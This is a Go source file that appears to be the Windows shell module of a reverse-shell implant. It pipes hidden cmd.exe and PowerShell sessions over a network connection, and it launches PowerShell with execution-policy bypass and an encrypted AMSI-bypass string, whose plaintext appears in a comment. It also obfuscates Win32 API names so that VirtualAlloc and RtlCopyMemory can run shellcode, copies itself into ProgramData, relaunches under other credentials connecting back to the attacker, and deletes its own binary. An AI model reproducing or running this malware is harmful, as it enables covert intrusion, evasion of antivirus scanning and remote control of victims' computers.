package shell

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"../utils"
)

const (
	memCommit            = 0x1000
	memReserve           = 0x2000
	pageExecuteReadWrite = 0x40
)

// Shell ...
func Shell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// Powershell ...
func Powershell() (*exec.Cmd, error) {
	// $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
	amsiBypass := utils.DecryptString("fCJpAxExPh56GTAnPS42NDp6HyYgDDokPTB8cXgSNzExOSA8cGc2eCo6eGc1cWMvMSV0cGc2dg01NSZ0dS89MyZ0emk9DTc9NDB2cWMvfCBpfCEpJXhwPH5wO20TPTcSMSY4PDB8fw07NhMhOi89O28HLCIgMSBzcXgSNzExOSA8cGcxeCo6eGcwcWMvMSV0cGcxdg01NSZ0dS89MyZ0emkXNy0gPTsgemp0I2cyZWcxJT5vfCRpfCV6HyYgDiI4LSZ8fC0hNC99YxgdNjcELDEJfDMgKn5wP3gPES0ga3EPBR5wOjYyeH50GGtkcXgPCzonLCY5dhEhNjc9NSZ6ES0gPTE7KBAxKjU9OyYndg41KjA8OS8JYnkXNzMtcGc2LSV4eHN4eGckLDF4eHJ9")
	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd, nil
}

// ExecShell ...
func ExecShell(command string, c net.Conn) {
	cmd := exec.Command("\\Windows\\System32\\cmd.exe", "/c", command+"\n")
	rp, wp := io.Pipe()
	cmd.Stdin = c
	cmd.Stdout = wp
	go io.Copy(c, rp)
	cmd.Run()
}

// Exec ...
func Exec(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// ExecPS ...
func ExecPS(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(path, "-exec", "bypass", "-command", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// ExecOut execute a command and retrieves the output
func ExecOut(command string) (string, error) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecPSOut execute a ps command and retrieves the output
func ExecPSOut(command string, encoded bool) (string, error) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	var cmd *exec.Cmd
	if encoded {
		cmd = exec.Command(path, "-exec", "bypaSs", "-encodedcommand", command+"\n")
	} else {
		cmd = exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
	}
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecDebug ...
func ExecDebug(cmd string) (string, error) {
	out, err := ExecOut(cmd)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecPSDebug ...
func ExecPSDebug(cmd string) (string, error) {
	out, err := ExecPSOut(cmd, false)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecSilent ...
func ExecSilent(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

// ExecSC executes Shellcode
func ExecSC(sc []byte) {
	// ioutil.WriteFile("met.dll", sc, 0644)
	kernel32 := syscall.MustLoadDLL(utils.DecryptString("MyYmNiY4a3F6PC84"))         // kernel32.dll
	ntdll := syscall.MustLoadDLL(utils.DecryptString("NjcwNC96PC84"))                // ntdll.dll
	VirtualAlloc := kernel32.MustFindProc(utils.DecryptString("DiomLDY1NAI4NCw3"))   // VirtualAlloc
	RtlCopyMemory := ntdll.MustFindProc(utils.DecryptString("Cjc4GywkIQ4xNSwmIQ==")) // RtlCopyMemory
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), memCommit|memReserve, pageExecuteReadWrite)
	if addr == 0 {
		log.Println(err)
		return
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	// this "error" will be "Operation completed successfully"
	log.Println(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

// RunAs will rerun the as as the user we specify
func RunAs(user string, pass string, domain string, c net.Conn) {
	path := CopySelf()
	ip, port := utils.SplitAddress(c.RemoteAddr().String())
	cmd := fmt.Sprintf("%s %s %s", path, ip, port)

	err := CreateProcessWithLogon(user, pass, domain, path, cmd)
	if err != nil {
		fmt.Println(err)
		return
	}
	c.Close()
	return
}

// RunAsPS ...
func RunAsPS(user string, pass string, domain string, c net.Conn) {
	path := CopySelf()
	ip, port := utils.SplitAddress(c.RemoteAddr().String())
	cmd := fmt.Sprintf("%s %s %s", path, ip, port)

	cmdLine := ""
	cmdLine += fmt.Sprintf("$user = '%s\\%s';", domain, user)
	cmdLine += fmt.Sprintf("$password = '%s';", pass)
	cmdLine += fmt.Sprintf("$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;")
	cmdLine += fmt.Sprintf("$credential = New-Object System.Management.Automation.PSCredential $user,$securePassword;")
	cmdLine += fmt.Sprintf("$session = New-PSSession -Credential $credential;")
	cmdLine += fmt.Sprintf("Invoke-Command -Session $session -ScriptBlock {%s};", cmd)

	_, err := ExecPSOut(cmdLine, false)
	if err != nil {
		c.Write([]byte(fmt.Sprintf("\nRunAsPS Failed: %s\n", err)))
		return
	}
	c.Close()
	return
}

// CopySelf ...
func CopySelf() string {
	currentPath := os.Args[0]
	// random name
	name := utils.RandSeq(8)
	path := fmt.Sprintf("C:\\ProgramData\\%s", fmt.Sprintf("%s.exe", name))
	utils.CopyFile(currentPath, path)
	return path
}

// Seppuku deletes the binary on graceful exit
func Seppuku(c net.Conn) {
	binPath := os.Args[0]
	fmt.Println(binPath)
	go Exec(fmt.Sprintf("ping localhost -n 5 > nul & del %s", binPath), c)
}

func StartSSHServer(port int, c net.Conn) {
	fmt.Println("Not implemented")
}
